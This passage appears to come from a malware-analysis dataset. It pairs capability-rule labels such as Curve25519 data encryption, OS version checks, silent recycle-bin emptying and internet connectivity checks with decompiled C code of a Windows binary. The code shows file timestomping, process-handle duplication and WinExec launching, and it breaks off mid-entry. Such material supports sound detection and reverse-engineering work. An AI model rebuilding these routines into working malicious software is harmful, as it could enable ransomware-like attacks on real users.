arg_8h);\n            }\n            if (iVar6 != 0) {\n                fcn.00401540();\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)();\n            (*_sym.imp.KERNEL32.dll_WinExec)(0x4113d0, 0);\n            return iVar6;\n        }\n    }\n    iVar2 = fcn.00404300(0x4113bc);\n    if (iVar2 == -1) goto code_r0x00401a51;\n    puVar7 = 0xe;\n    goto code_r0x00401a68;\n}\n",
        "token_count": 1705
    },
    "00403d20": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00403d20(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar2) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                iVar1 = arg_14h + -1;\n                bVar5 = true;\n                pcVar4 = arg_10h + 1;\n                pcVar3 = arg_8h;\n                do {\n                    pcVar3 = pcVar3 + 1;\n                    if (iVar1 == 0) break;\n                    iVar1 = iVar1 + -1;\n                    bVar5 = *pcVar3 == *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 313
    },
    "00403ad0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.00403ad0(void)\n\n{\n    uint32_t extraout_EDX;\n    uint var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    var_94h = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&var_94h);\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 155
    },
    "00404c80": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00404c80(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00401550(0x80000002, 0x41152c, 0x411578, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00402030": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402072) overlaps instruction at (ram,0x00402070)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.00402030(char *param_1, char param_2)\n\n{\n    char *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    char *extraout_ECX;\n    char *unaff_ESI;\n    uint8_t *unaff_EDI;\n    uint *puVar3;\n    bool bVar4;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    if ((&stack0xfffffffc < 0x80) || (SBORROW4(&stack0xfffffffc, 0x80) == &var_80h < 0)) {\n        pcVar1 = fcn.00403ad0();\n        param_1 = extraout_ECX;\ncode_r0x00402054:\n        if (pcVar1 == NULL) {\n            return false;\n        }\n        if ((pcVar1 < 0) || (pcVar1 >= 0)) {\n            fcn.00404520();\n            goto code_r0x0040208e;\n        }\n        bVar4 = false;\n    }\n    else {\n        if (-1 < &stack0xffffff78) {\n            *unaff_ESI = *unaff_ESI + unaff_ESI;\n            pcVar1 = unaff_ESI;\n            unaff_ESI = in_EAX;\n            goto code_r0x00402054;\n        }\n        *unaff_ESI = *unaff_ESI + unaff_ESI;\n        in_EAX[-0x56179ccd] = in_EAX[-0x56179ccd] + param_2;\n        unaff_ESI = unaff_ESI & 0xffffff00;\n        bVar4 = CARRY1(*unaff_EDI, param_1);\n        *unaff_EDI = *unaff_EDI + param_1;\n    }\n    *param_1 = *param_1 + bVar4;\n    *unaff_ESI = *unaff_ESI + unaff_ESI;\ncode_r0x0040208e:\n    iVar2 = fcn.00404300(0x4113c8);\n    if (iVar2 != -1) {\n        return false;\n    }\n    fcn.004032c0();\n    *0x424820 = 1;\n    iVar2 = fcn.00403a90();\n    if (iVar2 == 0) {\n        var_20h = 0;\n        var_80h._0_1_ = 0;\n        puVar3 = &var_1fh;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        var_60h._0_1_ = 0;\n        puVar3 = &var_80h + 1;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        var_40h._0_1_ = 0;\n        puVar3 = &var_60h + 1;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        puVar3 = &var_40h + 1;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        iVar2 = fcn.00404620(&var_80h, &var_60h, &var_20h, &var_40h);\n        if (iVar2 != 0) {\n            iVar2 = fcn.00404970(&var_20h);\n            if (iVar2 != 0) {\n                iVar2 = fcn.004018f0(&var_80h, &var_60h, &var_20h, &var_40h);\n                return iVar2 != 0;\n            }\n            return false;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 1091
    },
    "00403940": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00403940(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 72
    },
    "00403a90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ab7) overlaps instruction at (ram,0x00403ab5)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00403a90(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    \n    iVar2 = fcn.00403e20(0x411364);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iVar2 == -1) {\n        return 0;\n    }\n    *((*0x10 ^ *(unaff_EBX + 0x50)) - 4) = 0x403abe;\n    (*pcVar1)();\n    return 1;\n}\n",
        "token_count": 168
    },
    "00403b50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403bc4) overlaps instruction at (ram,0x00403bc2)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403b50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint hObject;\n    \n    iVar1 = fcn.00404300(0x4113d0);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar2 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 216
    },
    "00403c10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403c41) overlaps instruction at (ram,0x00403c3d)\n// \n\nuint fcn.00403c10(void)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    int32_t iVar2;\n    int32_t *unaff_ESI;\n    int32_t **unaff_EDI;\n    bool bVar3;\n    char cVar4;\n    int32_t iStack00000005;\n    \n    do {\n        bVar3 = false;\n        cVar4 = in_EAX == -1;\n        in_EAX = fcn.004043e0();\n        iVar2 = extraout_ECX;\n        *0x42481c = in_EAX;\n        if ((bVar3) || (!bVar3)) break;\n        iVar2 = extraout_ECX + -1;\n    } while (iVar2 != 0 && cVar4 != '\\0');\n    iVar1 = *unaff_ESI;\n    *unaff_EDI = unaff_ESI + 1;\n    *(iVar1 >> 0x1f) = *(iVar1 >> 0x1f) | iVar2 >> 8;\n    iStack00000005 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (iStack00000005 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    iVar2 = iStack00000005;\n    if (iVar1 != 0) {\n        if (*0x42481c != 0) {\n            iVar1 = fcn.00403b50(iStack00000005);\n            *0x42481c = iVar1 == 0;\n        }\n        fcn.004041b0(0, iVar2);\n        if (*0x42481c == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 448
    },
    "004041b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004041b0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x41139c;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00403e20(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1150
    },
    "00404300": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004043ce) overlaps instruction at (ram,0x004043cc)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404300(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint8_t *unaff_EBX;\n    uint *puVar3;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0xffffffff;\n    iVar1 = (**0x424824)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar3 = &var_12ch;\n    var_4h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x424828)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x004043cf:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_8h;\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        if (iVar1 == 0) {\n            if ((iVar1 < 0) || (iVar1 >= 0)) {\n                var_8h = var_128h;\n                iVar1 = var_4h;\n            }\n            else {\n                *unaff_EBX = *unaff_EBX & 0xc3;\n                *(extraout_ECX + 0x758bf855) = *(extraout_ECX + 0x758bf855) + -1;\n                iVar1 = -0x1bf31dd6;\n            }\n            goto code_r0x004043cf;\n        }\n        iVar2 = (**0x42482c)(var_4h, &var_130h);\n        iVar1 = var_4h;\n    } while( true );\n}\n",
        "token_count": 515
    },
    "00404cd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404d5a) overlaps instruction at (ram,0x00404d58)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __thiscall\nfcn.00404cd0(int32_t param_1, int32_t param_2, unkbyte3 param_3, uint param_4, uint param_5, uint *param_6, \n            uint *param_7, uint32_t param_8)\n\n{\n    uint8_t *puVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint arg_10h;\n    uint32_t unaff_EBX;\n    uchar *puVar5;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar6;\n    bool bVar7;\n    uchar uVar8;\n    char cVar9;\n    uint8_t in_IF;\n    bool bVar10;\n    ulong uVar11;\n    uint *in_stack_fffffed4;\n    int32_t in_stack_fffffed8;\n    uint in_stack_fffffedc;\n    uchar auStack272 [267];\n    uchar uStack5;\n    \n    bVar10 = false;\n    if ((&stack0xfffffffc < 0x10c) || (uVar3 = unaff_EBX,  SBORROW4(&stack0xfffffffc, 0x10c) == auStack272 < 0)) {\n        in_EAX = param_8 + 0x20;\n        in_stack_fffffedc = 0x20;\n        param_1 = param_2;\n        unaff_EBX = param_8;\n        unaff_ESI = param_7;\n        unaff_EDI = param_6;\n        in_stack_fffffed4 = param_7;\n        in_stack_fffffed8 = param_2;\n        uVar3 = in_EAX;\n    }\n    puVar5 = &uStack5;\n    *(unaff_EBX + 0x7d8b1c75) = *(unaff_EBX + 0x7d8b1c75) | param_1;\n    puVar1 = param_1 + 0x56;\n    bVar7 = false;\n    *puVar1 = *puVar1 & in_EAX;\n    cVar9 = *puVar1 < '\\0';\n    uVar8 = *puVar1 == 0;\n    uVar11 = fcn.00401070(unaff_EDI, in_stack_fffffed4, in_stack_fffffed8, in_stack_fffffedc, uVar3);\n    iVar4 = uVar11 >> 0x20;\n    iVar2 = uVar11;\n    if (!bVar7 && !uVar8) {\n        if (bVar7 || uVar8) {\n            *unaff_EDI = *unaff_ESI;\n            unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n            puVar5 = 0x8be181d1;\n            uVar3 = &stack0xfffffed0 | 0x8d;\n            cVar9 = '\\x01';\n            uVar8 = 0;\n            *(iVar2 + -4) = unaff_EBX;\n            *(iVar2 + -8) = uVar3;\n            *(iVar2 + -0xc) = extraout_ECX;\n            *(iVar2 + -0x10) = iVar4;\n            *(iVar2 + -0x14) = unaff_EBX;\n            *(iVar2 + -0x18) = iVar2 + -4;\n            *(iVar2 + -0x1c) = 0x8be181d1;\n            *(iVar2 + -0x20) = unaff_ESI + 1;\n            unaff_ESI = unaff_ESI + 1;\n            unaff_EDI = unaff_EDI + 1;\n            goto code_r0x00404d21;\n        }\n    }\n    uVar3 = CONCAT31(param_3, param_2._3_1_);\n    iVar4 = unaff_EBX + 0x60;\ncode_r0x00404d21:\n    fcn.00401070(unaff_EDI, unaff_ESI, uVar3, 0x20, iVar4);\n    if ((!uVar8) && (uVar8)) {\n        bVar10 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        cVar9 = (cVar9 * -0x80 | (uVar8 & 1) * '@' & 0x80) != 0;\n    }\n    fcn.00401070(unaff_EDI, unaff_ESI, *(puVar5 + 0x10), 0x20, unaff_EBX + 0xa0);\n    if ((cVar9) || (!cVar9)) {\n        arg_10h = *(puVar5 + 0x14);\n        iVar4 = unaff_EBX + 0xe0;\n    }\n    else {\n        iVar4 = 0;\n        arg_10h = extraout_ECX_00;\n    }\n    fcn.00401070(unaff_EDI, unaff_ESI, arg_10h, 0x20, iVar4);\n    iVar4 = fcn.00404c80();\n    if (iVar4 == -1) {\n        iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(unaff_EBX + 0x120) = iVar4 % 5;\n    }\n    else {\n        *(unaff_EBX + 0x120) = iVar4;\n    }\n    puVar5[-0x10c] = 0;\n    puVar6 = puVar5 + -0x10b;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + bVar10 * -2 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar5 + -4) = 0x104;\n    *(puVar6 + bVar10 * -4 + 2) = 0;\n    iVar4 = fcn.00401550(0x80000001, 0x4115ac, 0x4115d8, puVar5 + -8, puVar5 + -0x10c, puVar5 + -4);\n    if ((iVar4 != 0) && (iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(),  iVar4 == 0)) {\n        *(unaff_EBX + 0x120) = *(unaff_EBX + 0x120) | 0x80;\n    }\n    return iVar4;\n}\n",
        "token_count": 1547
    },
    "00401e30": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401e89) overlaps instruction at (ram,0x00401e88)\n// \n// WARNING: Removing unreachable block (ram,0x00401e62)\n\nuint __cdecl fcn.00401e30(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    ushort in_SS;\n    bool bVar8;\n    float10 fVar9;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    while( true ) {\n        var_4h = fcn.00403d20(arg_18h, arg_1ch, 0x4113a8, 7);\n        pcVar1 = _sym.imp.MSVCRT.dll_rand;\n        bVar8 = (POPCOUNT(var_4h & 0xff) & 1U) == 0;\n        if (var_4h == NULL) {\n            return 0;\n        }\n        if ((!bVar8) && (bVar8)) {\n            puVar6 = segment(in_SS, *0x10 + -0x34);\n            if (bVar8) {\n                return *puVar6;\n            }\n        }\n        var_24h = 0;\n        puVar6 = &var_23h;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        uVar4 = 0;\n        do {\n            uVar2 = (*pcVar1)();\n            (&var_24h)[uVar4] = uVar2;\n            uVar5 = uVar4 + 1;\n            iVar3 = uVar4 - 0x1f;\n            uVar4 = uVar5;\n        } while (uVar5 < 0x20);\n        if ((uVar5 < 0x21) || (uVar5 != 0x20 && SBORROW4(uVar5, 0x20) == iVar3 < 0)) break;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    puVar6 = &var_24h;\n    puVar7 = var_4h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    bVar8 = true;\n    fVar9 = fcn.00404cd0(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    if ((!bVar8) && (bVar8)) {\n        *(puVar7 + 7) = fVar9;\n    }\n    fcn.00401200(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 799
    },
    "00402260": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.00402260(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 285
    },
    "00403690": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403866) overlaps instruction at (ram,0x00403865)\n// \n\nvoid fcn.00403690(void)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t extraout_DL;\n    uint unaff_EBX;\n    uint8_t *unaff_EDI;\n    bool in_CF;\n    bool bVar5;\n    uint8_t in_AF;\n    bool in_ZF;\n    uchar uVar6;\n    bool bVar7;\n    char cVar8;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar9;\n    bool bVar10;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint arg_14h;\n    uint8_t uVar11;\n    uint8_t uVar12;\n    unkbyte3 Var13;\n    ushort uVar14;\n    uchar uVar15;\n    uchar uVar16;\n    uchar uVar17;\n    uchar uVar18;\n    uchar uVar19;\n    uchar uVar20;\n    ushort uVar21;\n    uchar uVar22;\n    uchar uVar23;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar3 = fcn.004015f0(0x407014, 0x10, 0x4116e0, 0x20);\n    uVar4 = ((uVar3 & 0xff00 | uVar3 & unaff_EBX >> 8) ^ 0x6200) - 0x3488 & 0x7ee5;\n    cVar9 = SCARRY4(uVar4, uVar4);\n    cVar8 = '\\0';\n    uVar6 = uVar4 == 0;\n    fcn.004015f0(0x407014, 0x10, 0x411700, 0x26);\n    arg_14h = 0x403706;\n    fcn.004015f0(0x407014, 0x10, 0x411728, 8);\n    if ((uVar6 || cVar9 != cVar8) || (!uVar6 && cVar9 == cVar8)) {\n        arg_14h = 0x19;\n    }\n    fcn.004015f0(0x407014, 0x10, 0x411730, arg_14h);\n    fcn.004015f0(0x407014, 0x10, 0x41174c, 0xb);\n    fcn.004015f0(0x407014, 0x10, 0x411758, 0x12);\n    fcn.004015f0(0x407014, 0x10, 0x41176c, 0x12);\n    fcn.004015f0(0x407014, 0x10, 0x411780, 2);\n    fcn.004015f0(0x407014, 0x10, 0x411784, 8);\n    fcn.004015f0(0x407014, 0x10, 0x41178c, 8);\n    bVar5 = false;\n    uVar2 = fcn.004015f0(0x407014, 0x10, 0x411794, 6);\n    if (!bVar5) {\n        unaff_EDI = unaff_EDI & 0xffff0000 | unaff_EDI & 0xff | (unaff_EDI >> 8) << 8;\n    }\n    cVar8 = uVar2 - *unaff_EDI;\n    iVar1 = (cVar8 < '\\0') * 0x80;\n    uVar11 = (in_NT & 1) * 0x4000 >> 8 | SBORROW1(uVar2, *unaff_EDI) * 0x800 >> 8 | (in_IF & 1) * 0x200 >> 8 |\n             (in_TF & 1) * 0x100 >> 8 | iVar1 >> 8;\n    uVar2 = iVar1 | (cVar8 == '\\0') * '@' | (in_AF & 1) * '\\x10' | ((POPCOUNT(cVar8) & 1U) == 0) * '\\x04' |\n            uVar2 < *unaff_EDI;\n    uVar12 = (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 | (in_VIF & 1) * 0x80000 >> 0x10 |\n             (in_AC & 1) * 0x40000 >> 0x10;\n    uVar6 = 0;\n    func_0x101897d8();\n    fcn.004015f0(0x407014, 0x10, 0x41179c, CONCAT13(uVar6, CONCAT12(uVar12, CONCAT11(uVar11, uVar2))));\n    fcn.004015f0(0x407014, 0x10, 0x4117a4, 7);\n    uVar21 = 6;\n    uVar22 = 0;\n    uVar23 = 0;\n    uVar17 = 0xac;\n    uVar18 = 0x17;\n    uVar19 = 0x41;\n    uVar20 = 0;\n    uVar14 = 0x10;\n    uVar15 = 0;\n    uVar16 = 0;\n    Var13 = 0x407014;\n    uVar6 = 0;\n    while( true ) {\n        fcn.004015f0(CONCAT13(uVar6, Var13), CONCAT13(uVar16, CONCAT12(uVar15, uVar14)), \n                     CONCAT13(uVar20, CONCAT12(uVar19, CONCAT11(uVar18, uVar17))), \n                     CONCAT13(uVar23, CONCAT12(uVar22, uVar21)));\n        bVar5 = extraout_DL < 0x51;\n        bVar10 = SBORROW1(extraout_DL, 'Q');\n        bVar7 = extraout_DL == 0x51;\n        uVar21 = 0x25;\n        uVar22 = 0;\n        uVar23 = 0;\n        uVar17 = 0xb4;\n        uVar18 = 0x17;\n        uVar19 = 0x41;\n        uVar20 = 0;\n        uVar14 = 0x10;\n        uVar15 = 0;\n        uVar16 = 0;\n        uVar6 = 0;\n        Var13 = 0x407014;\n        fcn.004015f0(0x407014, 0x10, 0x4117b4, 0x25);\n        if ((bVar5 || bVar7) || (!bVar5 && !bVar7)) break;\n        if (!bVar10) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.004015f0(0x407014, 0x10, 0x4117dc, 8);\n    return;\n}\n",
        "token_count": 1696
    },
    "00402a60": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
